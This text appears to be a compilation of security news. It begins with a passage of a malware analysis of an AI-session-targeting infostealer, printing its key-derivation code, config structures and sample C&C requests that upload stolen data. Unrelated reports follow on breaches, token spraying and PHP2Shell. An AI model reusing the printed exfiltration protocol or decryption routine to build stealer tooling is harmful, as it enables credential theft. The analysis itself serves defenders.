The encrypted configuration blob is stored in the .stgcfg section. It begins with a four-byte magic value STGC, followed by the ciphertext length, a 16-byte initialization vector (IV) used for AES-CBC decryption, and the encrypted configuration data.

struct EncryptedConfigBlob { DWORD magic; // Four-byte configuration magic DWORD ciphertext_len; // Encrypted configuration size in bytes BYTE iv[0x10]; // 16-byte AES-CBC initialization vector BYTE ciphertext[]; // Encrypted configuration data };

The AES IV is stored in the .stgcfg section, while the malware derives the AES key from a specific seed using the algorithm below. The routine produces a 32-byte key used to decrypt the configuration with AES-256-CBC.

""" Author: @Tera0017/Check Point Research """ def decrypt_aes_key(seed: int, length: int = 32) -> bytes: key = bytearray() for i in range(length): seed ^= (seed >> (8 * (i & 3))) & 0xFF seed = (seed * 0x01000193) & 0xFFFFFFFF seed ^= seed >> 16 key.append(seed & 0xFF) return bytes(key)

The decrypted configuration contains the command-and-control (C&C) URL, the server’s X25519 public key, a build ID, and a gate token used for communication. It also includes a module bitmask that controls which capabilities are executed, flags for language and analysis-environment checks, TLS certificate pinning settings, and up to three fallback URLs.

struct DecryptedConfig { char base_url[0x100]; BYTE server_x25519_public_key[0x20]; char build_id[0x20]; char gate_token[0x40]; DWORD module_mask; BYTE unk_184[0x404]; BYTE language_check; BYTE analysis_environment_check; BYTE unk_58A; BYTE tls_certificate_sha256[0x20]; BYTE tls_pin_enabled; BYTE fallback_urls[3][0x100]; BYTE fallback_count; };

The malware uses the module_mask bitmask in its configuration to control which built-in capabilities are executed. Each entry in the module-dispatch table contains a function pointer and an associated feature mask. During dispatch, the malware performs a bitwise AND between module_mask and the entry’s feature mask. A nonzero result selects the corresponding function for execution.

All module implementations remain embedded in the executable, even when disabled in the configuration.

Network

The malware retrieves its C&C connection settings from the decrypted configuration. It uses the /gate path as the base for three endpoints that handle session establishment, stolen data uploads, and session completion.

Path

Description

/gate/handshake

Establishes an upload session by sending the client’s raw 32-byte X25519 public key. The malware requires an HTTP 200 response before enabling uploads.

/gate/chunk

Uploads collected information packaged into ZIP archives and encrypted using AES-256-GCM. Each request body contains a 12-byte nonce, ciphertext, and a 16-byte authentication tag. Headers identify the upload label and sequence number.

/gate/complete

Signals the end of the upload phase by sending the eight-byte marker COMPLETE. The malware expects an HTTP 200 response and subsequently performs local session cleanup. This notification does not independently establish that every upload succeeded.

The stealer generates an X25519 key pair consisting of a public key and a private key. It then computes a shared secret using its private key and the server_x25519_public_key stored in the decrypted configuration. The malware derives the communication encryption key from this shared secret using SHA-256 and the fixed string aokigahara. The resulting 32-byte key is used for AES-GCM encryption.

/handshake

The initial handshake registers the upload session with the C&C server and sends the client’s 32-byte X25519 public key in the request body. The request headers include the build ID, gate token, session ID, hardware identifier, and key exchange algorithm.

POST /gate/handshake HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: cae87a25 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e X-Session: ca47b44161834cb70a224dbe3d92a383 X-HWID: 69B506A1 X-KEX: x25519 Content-Length: 32 Host: $SERVER $CLIENT_X25519_PUBLIC_KEY

/chunk

For each executed collection module, the malware uploads an AES-GCM-encrypted ZIP archive to /gate/chunk. The X-Chunk header identifies the type of stolen data, using module labels such as sysinfo, browsers, firefox, or aisessions. The X-Chunk-Index header identifies the upload’s sequence number, which is also included in the request body.

The malware allocates an upload buffer with a size equal to the ZIP archive’s size plus 28 bytes. The buffer begins with a 12-byte AES-GCM nonce, formed by combining the four-byte little-endian chunk index with eight randomly generated bytes. The encrypted ZIP archive follows the nonce, and a 16-byte AES-GCM authentication tag is appended at the end.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: sysinfo X-Chunk-Index: 0 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 3233 Host: $SERVER \x00\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

The next example uploads screenshot data with a chunk index of 1. The request body begins with \x01\x00\x00\x00.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: screenshot X-Chunk-Index: 1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 10066 Host: $SERVER \x01\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

/complete

After uploading all ZIP archives, the malware sends a final HTTP POST request to /gate/complete on the C&C server. The request body contains the eight-byte message COMPLETE, indicating that the upload process has finished.

POST /gate/complete HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 8 Host: $SERVER COMPLETE

The stealer appears to be under active development, with changes to its HTTP User-Agent string observed across versions. The latest analyzed samples use Microsoft-CryptoAPI/10.0 for communication with the server.

Conclusion

The malware retains the broad collection capabilities expected of an infostealer, but its dedicated targeting of AI applications and developer tools is particularly notable. By collecting authentication files, application storage, Git credentials, SSH-related files, and cloud configuration data, it reaches beyond traditional consumer accounts into AI-assisted development and cloud environments.

The targeting of AI sessions creates a potential route to monetization through unauthorized use of paid services or the resale of compromised access. It may also create opportunities for data extortion. Users can share sensitive business information, proprietary source code, and other confidential material with AI services. If stolen credentials or session tokens provide access to conversation histories or uploaded files, attackers could potentially threaten to disclose that information to demand payment.

The key finding is that AI application credentials and session data are part of this malware’s collection scope and should be treated as sensitive assets alongside browser sessions, cloud credentials, and developer keys.

Title: Hacker leaks 281 GB of data from Germany’s far-right AfD party
Context: cc leak site published AI-written summaries of hundreds of thousands of the messages into categories such as racism and antisemitism, graded Low to Critical, according to local...
Full Text:
Germany's far-right AfD (Alternative für Deutschland) party has confirmed that it has suffered a security breach, after a hacker published what appear to be hundreds of thousands of the controversial political party's internal emails.

Earlier this week, the AfD admitted that its hosting provider had been hacked in September, and that some of its mailboxes had been copied. The party claims that most of the affected mailboxes had not been used for years, but the leaked archive reportedly includes messages dated as recently as 12 September 2026.

The news came as the Hexane.cc leak site published AI-written summaries of hundreds of thousands of the messages into categories such as racism and antisemitism, graded Low to Critical, according to local media reports.

To add to the AfD's discomfort, reports suggest that the hacker's access may have been gained in an embarrassingly simple fashion, via a website that had allegedly been left unpatched. However, this has not been independently verified.

What is unusual is that the leaked emails are not published on the site directly. Instead, AI-generated summaries are shown, categorised and rated from Low to Critical. The site encourages anybody who wants to read a complete original email, including headers, message bodies, attachments, and DKIM signatures, to download it via a torrent.

Of course, everyone should be wary of trusting AI-generated summaries, as artificial intelligence has a history of making sometimes large mistakes with great confidence. Indeed, party sources told the media that although the leaked emails appeared to be authentic, the AI-generated summaries appeared to contain several inaccuracies.

The full corpus of 281 GB of stolen messages and files has been made available for download via the torrent, and claims to contain 421,179 stolen internal party emails as well as more than 100,000 files.

The hacker says the leak is intended to expose the party's "degeneracy and hypocrisy."

They have also claimed that someone with a Proton Mail email address reached out to them offering 100,000 Euros if the leak site was taken down.

Should you be tempted to download the torrent and explore the contents of the messages yourself? I would advise against it. In the past, cybercriminals have used torrents of trending topics in the public eye to distribute malware. That's before you even consider the possible legal questions that can arise from handling stolen personal data, whatever you might think of the individuals exposed.

It's not the first cybersecurity headache that the AfD has suffered recently. On 3 September, a press spokesman for the party's group in the Thuringia state parliament warned that his work email account had been used to send phishing emails, and urged recipients not to open PDF attachments they may have received.

Whatever you may think of the AfD, there appear to have been security failures in this case that are far too common. It's not unusual for websites to be overlooked or half-forgotten, and left unpatched. It's not rare for shared infrastructure to not be segmented properly.

Furthermore, whether you are an individual or an organisation, you should be aware that an email account can be a treasure trove of sensitive information. Even if it has not been used for years, it can hold vast amounts of correspondence that can be exploited by hackers and fraudsters.

Title: Gaming Giant Capcom Confirms Data Breach Exposed Users’ Personal Information
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Capcom, the gaming giant behind Resident Evil, Street Fighter and Monster Hunter, has warned that players’ personal information may have been compromised following a data breach.

In a notice published October 22, the Japanese company said customer information associated with CAPCOM ID was subject to unauthorized access by a third party.

CAPCOM ID is a unified account operated by Capcom that players can use to play Capcom-licensed games online as well as to access various web services.

As of October 22, Capcom estimated that the data compromised include:

11,774,247 records of email addresses and system-specific identifier information (e.g. date and time of account creation, date and time of last login, number of logins, client IP address used during last login)

43 records of date of birth, gender, country/region and nickname

Capcom has not confirmed any compromise of CAPCOM ID account login passwords originally set by customers themselves. However, it has observed that passwords were changed without authorization on 196 customer accounts.

“The passwords associated with these accounts have already been reset, and the company continues to investigate the scope of any impact resulting from this incident,” the company said.

It also confirmed that credit card information remains unaffected by the breach.

Capcom has warned that the affected information could potentially be misused in fraudulent emails or other communications impersonating the company or related parties.

It has advised customers to exercise caution when receiving suspicious messages and avoid clicking on links or opening attachments.

The company also confirmed that services using CAPCOM ID, including its games, remain available

Timeline of Capcom Data Breach and Company Response

Capcom detected suspicious activity involving its CAPCOM ID account system on October 19, 2026, indicating potential unauthorised access.

The company said it immediately moved to block the access, investigate the cause and scope of the incident, and implement emergency response measures. Later that day, Capcom confirmed that unauthorised access had occurred and began identifying and addressing the attack method.

On October 20, Capcom established an internal incident response headquarters to coordinate its investigation and prevent further impact.

The investigation confirmed that certain customer information registered with CAPCOM ID had been accessed without authorisation. The company also discovered that passwords associated with a limited number of accounts had been changed without permission.

Capcom subsequently reported the incident to its external Information Technology Security Oversight Committee.

By October 21, Capcom had completed emergency response measures and identified and addressed the attack method and reported the incident to the Osaka Prefectural Police and Japan’s Personal Information Protection Commission.

Title: Widespread Token-Spraying Attacks Target Microsoft 365 Accounts For Email Compromise
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
A newly uncovered and widespread business email compromise (BEC) campaign targeted Microsoft 365 environments in an operation which made hundreds of thousands of attempts to access corporate networks around the world.

Identified by cybersecurity researchers at Huntress, the campaign used fake sign-in pages, device-code phishing, stolen session tokens and social engineering in attacks which appeared to be setting the stage for BEC BEC attacks.

As detailed in a blog post published on October 22, researchers launched an investigation following a series of suspicious “sign-in events” across 79 Huntress customer organizations which took place between July and September 2026.

What they found was a global campaign which targeted corporate Microsoft 365 environments with adversary-in-the-middle (AiTM) attacks, which allowed the attackers to compromise accounts without the attacker ever needing to steal the passwords associated with them.

The attackers achieved this by stealing the login tokens which help to provide access to the account. Crucially for the attackers, these tokens are generated after the real login page has been legitimately used and any associated multi-factor authentication (MFA) has verified the account. That means that whoever holds the token doesn’t need to pass MFA again.

The attackers then replayed the stolen tokens from their own machines in automated sign-in attempts against Microsoft 365 services.

Active Compromise Within Minutes

These ‘token-spraying’ attacks probed Microsoft 365 environments around the world. Researchers at Huntress observed the threat actor behind the campaign make at least 200,000 login attempts, which included 497 successful sign-ins. In many cases, the attackers were inside environments just minutes after stealing the tokens.

The attackers used this initial access to modify controls around Microsoft 365 environments in an attempt to make future access easier.

For example, in several observed incidents, the attackers wiped the victim’s MFA settings and added their own phone to the account user, so a simple password reset wouldn’t lock them out, because now the attacker had their own authenticator app for the environment.

Other methods the attackers used to help maintain persistence on the compromised networks included hidden email rules in victim inboxes that quietly moved messages from specific contacts out of sight. They even modified Entra settings to add their own devices as legitimately registered on the network to request additional tokens if needed in future.

The attackers were also observed using a compromised mailbox to send a payroll-related phishing email message. Using a legitimate email to send these requests increases the likelihood of a business email compromise attack working. In this case, however, it appears the attackers did not receive a payment from their intended victim.

The nature of this campaign means that the attackers can easily establish persistence on the network. But Huntress emphasised that there are actions which can be taken to reduce the risk from these kinds of campaigns.

“Conditional Access Policies (CAP) can help fill some of the security gaps that MFA can't, as long as they're appropriately implemented. Businesses setting up CAPs should require MFA (or block) for All Users, All Cloud Apps, and All Client App types, unconditionally,” said Huntress.

If companies suspect a token replay compromise, it is advised that they revoke the sessions and reset the password, perform an audit of Entra devices and MFA methods and review inbox rules to identify if anything has been changed.

Title: Attacks on Tech Firms Behind Most Third-Party Data Breach Victims
Context: More than two-thirds (69%) of data breach victims in the past year were affected by a third-party breach, a new report by financial and risk advisory provider Kroll has found
Full Text:
More than two-thirds (69%) of data breach victims in the past year were affected by a third-party breach, a new report by financial and risk advisory provider Kroll has found.

Of those individuals, most (79%) had their data accessed following the compromise of a technology company during the period June 2025 to June 2026.

This is far higher than the proportion of third-party data breaches emanating from other industries, which includes finance (9%), insurance (6%) or healthcare (5%).

Incidents affecting technology firms also caused 60% of the total number of data breach victims – whether emanating from a single organization or as part of a supply chain breach – over the 12-month period. This was followed by insurance (10%), finance (8%), healthcare (8%) and education (7.5%).

Among all security leaders surveyed for the Kroll report, published on October 22, 69% said their organization had suffered a breach in the previous 12 months, while 34% reported experiencing more than one.

Finance and Professional Services Most Breached Sectors

Despite the tech sector causing the vast majority of individual data breach victims, it was only the seventh most commonly breached sector.

In first place was finance, making up 20% of breaches observed by Kroll. This was followed by professional services (20%), healthcare (15%) and retail (8%).

In contrast, technology only made up 6% of data breach incidents.

Title: The adversary economy: How threat actors are reacting to PHP2Shell
Context: They evaluate this exposure in precisely the same terms as a CISO assessing a critical unpatched vulnerability: the question is not whether someone will attempt exploitation,...
Full Text:
Two critical PHP vulnerabilities sent criminal forum operators scrambling to protect their own infrastructure, revealing that threat actors face the same exposure management challenges as the organizations they target.

Key takeaways

The adversary economy operates on the same fundamental principles as the legitimate economy.

Forum self-evacuations: Criminal forums including BreachForums initiated emergency infrastructure migrations, taking themselves offline within hours of PHP2Shell disclosure, citing direct risk to their operations.

Underground operators face a dual threat: both law enforcement and rival criminal groups could weaponize PHP2Shell against forum infrastructure storing member identities, private communications, and stolen credentials.

The adversary response mirrors legitimate enterprise incident response, including emergency patching, platform migration, and business continuity planning.

Historical precedent from the 2024 BreachForums seizure conditioned criminal operators to treat infrastructure vulnerabilities as existential business risks

Background

PHP powers an estimated 75% of websites with identifiable server-side technology, making it the backbone of the modern web. That infrastructure extends far beyond legitimate businesses. Criminal forums, dark web marketplaces, and underground communication platforms rely on the same PHP-based software stacks, such as phpBB, custom forum engines, and web-based administration panels, that power their legitimate counterparts.

On Oct. 20, 2026, two critical unauthenticated remote code execution vulnerabilities in PHP were publicly disclosed: CVE-2026-109618 (OOM Corruption) and CVE-2026-109619 (Stale Global State), each carrying a CVSS v4.0 score of 9.2. The two flaws target different stages of PHP’s memory management, and chaining them together yields a more reliable exploitation path than either alone. Researchers credit frontier AI models with both the initial discovery and the exploitation chain connecting them. Tenable Vulnerability Watch classified both as Vulnerabilities of Concern (VOC). Within hours, the cybersecurity community began its familiar cycle of assessment, patching, and remediation. (For a full technical breakdown, see our blog “php2shell: Frequently asked questions about critical PHP remote code execution vulnerabilities”.)

At the same time, a parallel response was already underway including criminal forum self-evacuations and steps to protect the adversary economy.

“We take our security seriously”

The adversary economy operates on the same fundamental principles as the legitimate economy. Criminal operators invest in infrastructure, manage risk, plan for business continuity, and respond to threats against their operations with the same systematic urgency that any well-run organization would apply. From the credential theft supply chains we documented earlier this year to the infrastructure-level emergency playing out now, a consistent pattern emerges: the underground functions as an economy, and economies have attack surfaces. PHP2Shell affected both sides of the security divide simultaneously, and the underground's response demonstrates that sophisticated threat actors have already internalized the severity of this exposure.

Within 48 hours of PHP2Shell disclosure, administrators across multiple major criminal forums posted emergency notices to their communities. BreachForums, one of the largest English-language criminal marketplaces, posted an advisory that included a phrase familiar to anyone who has read a corporate breach notification: “We take our security seriously.”

The irony is difficult to overstate. A platform best known for trafficking stolen credentials, facilitating ransomware operations, and hosting leaked corporate data deployed the same language that Fortune 500 companies use after their own security incidents. But behind the borrowed corporate-speak was genuine operational urgency.

BreachForums was not alone. DarkForums posted its own shutdown notice: “DF will remain offline until PHP has been patched globally.” PwnForums went dark without explanation. Dread, the Reddit-like platform serving the Tor ecosystem, posted a maintenance notice explicitly naming both CVEs. Several forums temporarily restricted new registrations, and others migrated critical communications to Telegram channels as a contingency measure, treating their PHP-based web platforms as potentially compromised infrastructure.

The dual threat

The urgency behind these evacuations reflects a threat model that legitimate organizations would recognize immediately. Criminal forums run on PHP infrastructure, and that infrastructure stores exactly the kind of data that makes a vulnerability like PHP2Shell catastrophic.

The simultaneous self-evacuation is a significant behavioral indicator. Analysis from DarkOwl, a dark web intelligence firm, highlighted the scope of what sits behind a typical forum’s PHP application layer: member email addresses, IP logs, private messages, financial transaction records, and the very stolen credentials that members uploaded for sale. A successful exploit of a forum’s PHP stack would not merely disrupt the platform. It would expose the identities and operational security of every participant.

Forum operators face a threat that most legitimate businesses do not: the adversary attacks from two directions simultaneously. Law enforcement agencies have demonstrated both the capability and the willingness to exploit criminal infrastructure, as the FBI’s operation against Hive ransomware and multiple forum takedowns have shown. But rival criminal groups represent an equally serious threat. Competing forums, extortionists, and opportunistic hackers all have incentive to breach a rival platform’s database to steal its user base, to extort its operators, or to eliminate competition.

This dual threat transforms a PHP vulnerability from a technical issue into an existential business risk. The criminal underground last evacuated platforms at this scale during the 2024 BreachForums seizure — but that response was triggered by law enforcement action. PHP2Shell marks the first time a technical vulnerability in shared infrastructure provoked the same reaction, a shift suggesting criminal operators now treat their PHP dependency as a systemic single point of failure. They evaluate this exposure in precisely the same terms as a CISO assessing a critical unpatched vulnerability: the question is not whether someone will attempt exploitation, but when.

The BreachForums lesson

That institutional memory was shaped by hard experience. The 2024 FBI seizure of BreachForums demonstrated in concrete terms what happens when criminal infrastructure is compromised.

That seizure resulted in the exposure of operational details, the arrest of the forum’s administrator, and the disruption of thousands of active criminal operations that depended on the platform. For the underground economy, it was the equivalent of a major supply chain breach: a single point of failure that cascaded across an entire ecosystem.

The lesson was absorbed. Criminal operators began treating their web infrastructure as a single point of failure requiring the same resilience planning that legitimate enterprises apply to critical systems. PHP2Shell validated that concern. The two CVEs affect every PHP version below 8.3, meaning that the approximately 59% of internet-facing PHP hosts running end-of-life branches are permanently exposed absent a version upgrade. Criminal forums running older PHP versions face the same impossible math as any enterprise with a large install base of unsupported software: the patch does not exist, and the only remediation is migration.

From defense to offense: the exploit economy

The criminal underground’s relationship with PHP2Shell extends beyond defensive measures. Intelligence reporting indicates that exploit code for both CVEs circulated in private channels before the public embargo lifted, with pre-disclosure exploitation observed as early as Oct. 17 from infrastructure traced to an IP address geolocated in Australia.

The exploit development pipeline has accelerated in ways that should concern every organization running PHP. Researchers have documented the use of AI-assisted vulnerability analysis tools to accelerate the development of working exploits and to identify additional exploitation vectors within the disclosed vulnerability classes. This represents a broader trend in which the same AI capabilities that accelerate defensive security research simultaneously compress the window between disclosure and weaponization.

The monetization forecast follows a pattern we have documented before. The developer credential economy operates through three layers (generation, distribution, and weaponization), and PHP2Shell maps cleanly onto each. Initial access brokers will package PHP2Shell exploitation into their service offerings. Ransomware affiliates will incorporate the vulnerabilities into their initial access playbooks. And the criminal forums that patched their own infrastructure will become the marketplaces for selling access to organizations that did not. We saw a preview of this commoditization cycle during the Miasma campaign, where open-sourced attack toolchains accelerated exploitation at scale. The adversary economy is efficient: the same operators who scrambled to protect their own PHP stacks will profit from organizations that fail to do the same.

What this means for defenders

The criminal underground’s reaction to PHP2Shell is, paradoxically, one of the clearest available signals of the vulnerability’s severity. When threat actors treat a disclosure as an emergency requiring immediate operational response, defenders should calibrate their own urgency accordingly.

Organizations running PHP should treat both CVE-2026-109618 and CVE-2026-109619 as immediate remediation priorities. Every PHP version below 8.3 is affected, and no patches will be issued for end-of-life branches including all of PHP 5.x, 7.x, 8.0, 8.1, and 8.2. For environments where an immediate upgrade is not feasible, compensating controls including web application firewalls, network segmentation, and enhanced monitoring for exploitation indicators should be deployed without delay. The criminals have already patched. The question for every organization is whether they will do the same before the exploit economy catches up.

Identifying affected systems
